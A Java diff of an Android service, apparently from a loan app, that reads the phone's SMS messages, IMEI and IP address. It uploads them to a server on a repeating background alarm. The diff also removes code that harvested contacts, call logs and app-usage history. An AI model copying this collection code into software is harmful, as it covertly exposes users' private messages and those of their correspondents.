@@ -1,10 +1,8 @@
-package com.eduvanz;
+package com.eduvanz.newUI.services;
 
-import android.annotation.TargetApi;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
-import android.app.usage.UsageStats;
-import android.app.usage.UsageStatsManager;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -17,12 +15,17 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.support.annotation.Nullable;
 import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import com.eduvanz.MainApplication;
+import com.eduvanz.MyService;
+import com.eduvanz.SmsPojo;
+import com.eduvanz.Utils;
+import com.eduvanz.newUI.receiver.AlarmReceiverForFileUpload;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -39,9 +42,10 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
-import java.util.List;
 
 import static com.eduvanz.MainApplication.TAG;
 
@@ -49,7 +53,7 @@ import static com.eduvanz.MainApplication.TAG;
  * Created by projetctheena on 19/9/17.
  */
 
-public class MyService extends Service {
+public class MyServiceReadSms extends Service {
 
     Context context;
     static String stringAllSmsContacts;
@@ -57,6 +61,9 @@ public class MyService extends Service {
     public static String userID="", userMobileNo="", userLoggedinID="";
     private LongOperation longOperation = null, longOperation2 = null, longOperation3 = null, longOperation4 = null;
     public static String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress = "";
+    public  String smsTimeStamp;
+    public static Date lDateSMS;
+    public  static SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 
     @Nullable
     @Override
@@ -65,24 +72,49 @@ public class MyService extends Service {
     }
 
     @Override
-    public void onCreate() {
+    public void onCreate()
+    {
         Log.e(MainApplication.TAG, "Service onCreate");
         context = this;
-
         Log.e(MainApplication.TAG, "Alarm received!: ");
-        Log.e(TAG, "MyService  : 11111111111111111111111111" );
+        Log.e(TAG, "MyService CALL LOG  : 11111111111111111111111111" );
         /** getting data from shared preference **/
         SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
-        userLoggedinID = sharedPreferences.getString("logged_id", "null");
+//        userLoggedinID = sharedPreferences.getString("logged_id", "null");
         userMobileNo = sharedPreferences.getString("mobile_no", "null");
-        userID = sharedPreferences.getString("logged_id", "null");
+//        userID = sharedPreferences.getString("logged_id", "null");
 
-        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        imeiNo = telephonyManager.getDeviceId();
-        ipaddress = Utils.getIPAddress(true);
-        Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress +" USER ID :"+ userID);
+        smsTimeStamp = sharedPreferences.getString("smsTimeStamp", "null");
+        Log.e(TAG, "onCreate: "+smsTimeStamp );
+        try {
+
+            lDateSMS= simpleDateFormat.parse(smsTimeStamp);
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            imeiNo = telephonyManager.getDeviceId();
+            ipaddress = Utils.getIPAddress(true);
+            Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress );
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        // adding pending intent
+        PendingIntent pendingIntent;
+        Intent intent = new Intent(context, AlarmReceiverForFileUpload.class);
+        pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        Calendar calendar = Calendar.getInstance();
+        int interval = 2 * 60 * 60 * 1000;
+//            int interval = 2 * 1000;
+        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), interval, pendingIntent);
+
 
     }
+
+
 
     /**
      * Read SMS
@@ -139,51 +171,59 @@ public class MyService extends Service {
 //                    Log.e("Readsms", "" + objSms.get_address() + "\n" + objSms.get_msg()+
 //                            "\n person"+peron+"\n type"+type+"\n ID"+id+"\n Date"+date);
                     cur.moveToNext();
-
-
-//                    /** INSERT DATE INTO SQL DATABASE **/
-//                    if (d == 0) {
-//                        d++;
-//                        DBHandler dbHandler = new DBHandler(c);
-//                        dbHandler.addDate(date, "1");
-//                        latestSmsDate = date;
-//                    }
-
-                    // create new object
-//                    listPojo= new ListPojo();
-//                    //add data to this object
-//                    listPojo.address=objSms.get_address();
-//                    listPojo.message=objSms.get_msg();
-//                    listPojo.type=objSms.get_time();
-//                    //create ListArray
-//                    mList.add(listPojo);
-                    JSONObject mObject = new JSONObject();
-                    mObject.accumulate("from", objSms.get_address());
-                    mObject.accumulate("message", objSms.get_msg());
-                    mObject.accumulate("time", objSms.get_time());
-                    mObject.accumulate("type", type);
-                    mObject.accumulate("sms_id", id);
-
-//                    if (!latestSmsDate.equalsIgnoreCase("")) {
-//                        long a = Long.parseLong(latestSmsDate) - Long.parseLong(date);
-//                        if (a < 0) {
+                    Log.e(TAG, "readSms: "+date);
+                    try {
+//                        Date smsDate=simpleDateFormat.parse(date);
+                        long dateOfSms=Long.valueOf(date);
+//                        Log.e(TAG, "readSms: "+dateOfSms);
+                    if(lDateSMS != null)
+                    {
+                        if(lDateSMS.getTime() < dateOfSms)
+                        {
+                            Log.e(TAG, "callLogs: lDateCall Notnull " + lDateSMS.getTime());
+                            Log.e(TAG, "callLogs: callDayTime " + dateOfSms);
+                            JSONObject mObject = new JSONObject();
+                            mObject.accumulate("from", objSms.get_address());
+                            mObject.accumulate("message", objSms.get_msg());
+                            mObject.accumulate("time", objSms.get_time());
+                            mObject.accumulate("type", type);
+                            mObject.accumulate("sms_id", id);
                             json.put(mObject);
-//                        }
-//                    } else {
-//                        json.put(mObject);
-//                    }
+                        }
+                    }else {
+                        Log.e(TAG, "callLogs: Date is null callDayTime is " + objSms.get_time());
+                        JSONObject mObject = new JSONObject();
+                        mObject.accumulate("from", objSms.get_address());
+                        mObject.accumulate("message", objSms.get_msg());
+                        mObject.accumulate("time", objSms.get_time());
+                        mObject.accumulate("type", type);
+                        mObject.accumulate("sms_id", id);
+                        json.put(mObject);
+                    }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
                 }
-                outerOb.accumulate("student_id", studentID);
-                outerOb.accumulate("student_mobile_no", userNo);
+//                outerOb.accumulate("student_id", studentID);
+//                outerOb.accumulate("student_mobile_no", userNo);
                 outerOb.accumulate("created_by_ip", ipaddress);
-                outerOb.accumulate("sim_serial_no", simImei);
+//                outerOb.accumulate("sim_serial_no", simImei);
+                outerOb.accumulate("sim_serial_no", imeiNo);
                 outerOb.accumulate("imei", imeiNo);
+//                outerOb.accumulate("mobileNo", userMobileNo);
                 outerOb.put("Sms_info", json);
                 message = outerOb.toString();
-                Log.e("", "readSms: "+message );
+                Log.e("Message ", "message: "+message );
+                Log.e("Message ", "outerOb: "+outerOb );
 
             }
-            mCreateAndSaveFile("saveSMS.json", message);
+            if(json.length()>2)
+            {
+                mCreateAndSaveFile("saveSMS.json", message);
+            }else {
+                Log.e(TAG, "readSms: UPDATED ALREADY NO DATA IN JSON " );
+            }
+
 
 
         } catch (SQLiteException ex)
@@ -195,185 +235,6 @@ public class MyService extends Service {
         }
     }
     /** END of Read SMS **/
-
-
-    /**
-     * CONTACTS READ
-     **/
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-    public static void contactsRead(Context c) throws JSONException {
-        Log.e(MainApplication.TAG, " contactsRead: 3333333333333333333333333333" );
-        Context context = c;
-        JSONArray jsonArray = new JSONArray();
-        String phoneNo = "";
-        String name = "";
-        String contacts="";
-        JSONObject outerOb = new JSONObject();
-
-        ContentResolver cr = c.getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null);
-
-        try {
-
-            if (cur.getCount() > 0) {
-                while (cur.moveToNext()) {
-                    String id = cur.getString(
-                            cur.getColumnIndex(ContactsContract.Contacts._ID));
-                    name = cur.getString(cur.getColumnIndex(
-                            ContactsContract.Contacts.DISPLAY_NAME));
-
-                    if (cur.getInt(cur.getColumnIndex(
-                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                        Cursor pCur = cr.query(
-                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                                null,
-                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                                new String[]{id}, null);
-                        while (pCur.moveToNext()) {
-                            phoneNo = pCur.getString(pCur.getColumnIndex(
-                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
-//                            Log.e(TAG, "CONTACTS: ");
-                        }
-                        pCur.close();
-                    }
-
-                    JSONObject mObject = new JSONObject();
-                    mObject.accumulate("contact_name", name);
-                    mObject.accumulate("contact_mobile_no", phoneNo);
-
-                    jsonArray.put(mObject);
-
-                }
-                outerOb.accumulate("student_id", userID);
-                outerOb.accumulate("student_mobile_no", userMobileNo);
-                outerOb.accumulate("created_by_ip", ipaddress);
-                outerOb.accumulate("sim_serial_no", simImei);
-                outerOb.accumulate("imei", imeiNo);
-                outerOb.put("contacts_info", jsonArray);
-                contacts = outerOb.toString();
-
-                Log.e(TAG, "contacts: " + contacts);
-            }
-            mCreateAndSaveFile("saveContacts.json", contacts);
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-    }
-
-    /** END OF CONTACTS READ **/
-
-
-    /**
-     * CALL LOGS READ
-     **/
-
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-    public static void callLogs(Context context) {
-        Log.e(MainApplication.TAG, " callLogs: 444444444444444444444444444444444" );
-
-        String phNumber="", callType="", callDuration="", logs="";
-        JSONArray jsonArray = new JSONArray();
-        JSONObject outerOb = new JSONObject();
-
-
-        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
-            return;
-        }
-        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
-                null, null, null, CallLog.Calls.DATE + " DESC");
-
-        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
-        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
-        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
-
-        while (cursor.moveToNext()) {
-            phNumber = cursor.getString(number);
-            callType = cursor.getString(type);
-            String callDate = cursor.getString(date);
-            Date callDayTime = new Date(Long.valueOf(callDate));
-            callDuration = cursor.getString(duration);
-            String dir = null;
-
-            JSONObject mObject = new JSONObject();
-            try {
-                mObject.accumulate("callee_number", phNumber);
-                mObject.accumulate("call_type", callType);
-                mObject.accumulate("call_duration", callDuration);
-                mObject.accumulate("call_date", callDayTime);
-                jsonArray.put(mObject);
-
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-        }
-        cursor.close();
-        try {
-            outerOb.accumulate("student_id", userID);
-            outerOb.accumulate("student_mobile_no", userMobileNo);
-            outerOb.accumulate("created_by_ip", ipaddress);
-            outerOb.accumulate("sim_serial_no", simImei);
-            outerOb.accumulate("imei", imeiNo);
-            outerOb.put("call_logs", jsonArray);
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-        logs = outerOb.toString();
-        mCreateAndSaveFile("saveCallLogs.json", logs);
-
-    }
-
-    /**
-     * APP STATS READ
-     **/
-
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-    public  static void appStats(Context context){
-        Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555" );
-        JSONArray jsonArray = new JSONArray();
-        String appUseage="";
-        JSONObject outerOb = new JSONObject();
-        Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555  SIZE" + getUsageStatsList(context).size());
-        for(int i=0; i<getUsageStatsList(context).size();i++) {
-            JSONObject mObject = new JSONObject();
-            if(getUsageStatsList(context).get(i).getTotalTimeInForeground()>0) {
-                try {
-                    mObject.accumulate("app_name", getUsageStatsList(context).get(i).getPackageName());
-                    mObject.accumulate("appusage_time", getUsageStatsList(context).get(i).getTotalTimeInForeground());
-                    jsonArray.put(mObject);
-
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
-
-            }
-        }
-
-        try {
-            outerOb.accumulate("student_id", userID);
-            outerOb.accumulate("student_mobile_no", userMobileNo);
-            outerOb.accumulate("created_by_ip", ipaddress);
-            outerOb.accumulate("sim_serial_no", simImei);
-            outerOb.accumulate("imei", imeiNo);
-            outerOb.put("app_stats", jsonArray);
-
-            appUseage = outerOb.toString();
-            mCreateAndSaveFile("saveAppStats.json", appUseage);
-
-        } catch (JSONException e) {
-            e.printStackTrace();
-        }
-
-    }
 
     public static void mCreateAndSaveFile(String params, String mJsonResponse) {
         Log.e(MainApplication.TAG, " mCreateAndSaveFile:" );
@@ -389,7 +250,6 @@ public class MyService extends Service {
             file.write(mJsonResponse);
             file.flush();
             file.close();
-
             mReadJsonData(params);
         } catch (IOException e) {
             e.printStackTrace();
@@ -397,16 +257,6 @@ public class MyService extends Service {
     }
 
 
-    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
-    public static List<UsageStats> getUsageStatsList(Context context){
-        UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
-        Calendar calendar = Calendar.getInstance();
-        long endTime = calendar.getTimeInMillis();
-        calendar.add(Calendar.YEAR, -1);
-        long startTime = calendar.getTimeInMillis();
-        List<UsageStats> usageStatsList = usm.queryUsageStats(UsageStatsManager.INTERVAL_YEARLY,startTime,endTime);
-        return usageStatsList;
-    }
 
     public static void mReadJsonData(final String filename) {
         Log.e(TAG, "mReadJsonData: " );
@@ -427,9 +277,10 @@ public class MyService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
 
         Log.e(MainApplication.TAG, "Service onStartCommand");
+        Log.e(TAG, "selectOperations: " );
 
-        selectOperations();
-
+        longOperation = new LongOperation();
+        longOperation.execute("sms");
         //start sticky means service will be explicity started and stopped
         return Service.START_STICKY;
     }
@@ -439,53 +290,14 @@ public class MyService extends Service {
 
     }
 
-    private void selectOperations()
-    {
-        Log.e(TAG, "selectOperations: " );
-
-        longOperation = new LongOperation();
-        longOperation.execute("sms");
-
-        longOperation2 = new LongOperation();
-        longOperation2.execute("contacts");
-
-        longOperation3 = new LongOperation();
-        longOperation3.execute("calllogs");
-
-        longOperation4 = new LongOperation();
-        longOperation4.execute("appstats");
-    }
-
-
     /** ---------------- ASYNC TASK --------------**/
     private class LongOperation extends AsyncTask<String, Void, Void> {
 
         @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
         @Override
         protected Void doInBackground(String... params) {
-            Log.e(TAG, "doInBackground: " );
-            String operationName = params[0];
-
-            switch (operationName){
-
-                case "sms":
-                    readSms(context, userMobileNo, userID);
-                    break;
-                case  "contacts":
-                    try {
-                        contactsRead(context);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
-                    break;
-                case  "calllogs":
-                    callLogs(context);
-                    break;
-                case  "appstats":
-                    appStats(context);
-                    break;
-            }
-
+            Log.e(TAG, "doInBackground: "+params[0] );
+            readSms(context, userMobileNo, userID);
             return null;
         }
 
@@ -623,10 +435,11 @@ public class MyService extends Service {
                 dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
 //                taOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
 //                        + selectedFilePath + "\"" + lineEnd);
-                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"studentId\";studentId=" + userID + "" + lineEnd);
+                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"mobileNo\";mobileNo=" + userMobileNo + "" + lineEnd);
                 dataOutputStream.writeBytes(lineEnd);
-                dataOutputStream.writeBytes(userID);
+                dataOutputStream.writeBytes(userMobileNo);
                 dataOutputStream.writeBytes(lineEnd);
+                Log.e(TAG, "uploadFile:mobileNo--- sent "+userMobileNo );
 
                 //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                 //        + "=" + URLEncoder.encode("1", "UTF-8"));
@@ -641,8 +454,8 @@ public class MyService extends Service {
 
                 while ((output = br.readLine()) != null) {
                     sb.append(output);
-                    Log.e("ReadSms", "uploadFile: " + br);
-                    Log.e("ReadSms", "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
+                    Log.e("ReadSms", "uploadFile: SMS " + br);
+                    Log.e("ReadSms", "Server Response is: SMS " + serverResponseMessage + ": " + serverResponseCode);
                 }
                 Log.e("ReadSms ", "uploadFile: " + sb.toString());
 
@@ -652,9 +465,9 @@ public class MyService extends Service {
 //                        @Override
 //                        public void run() {
 //                            Toast.makeText(context, sb.toString(), Toast.LENGTH_SHORT).show();
-                    Log.e(TAG, "uploadFile: "+sb.toString() );
+                    Log.e(TAG, "uploadFile: SMS"+sb.toString() );
 
-                    Log.e("ReadSms", " here: \n\n" + fileName);
+                    Log.e("ReadSms", " here: SMS \n\n" + fileName);
 //                        }
 //                    });
                 }
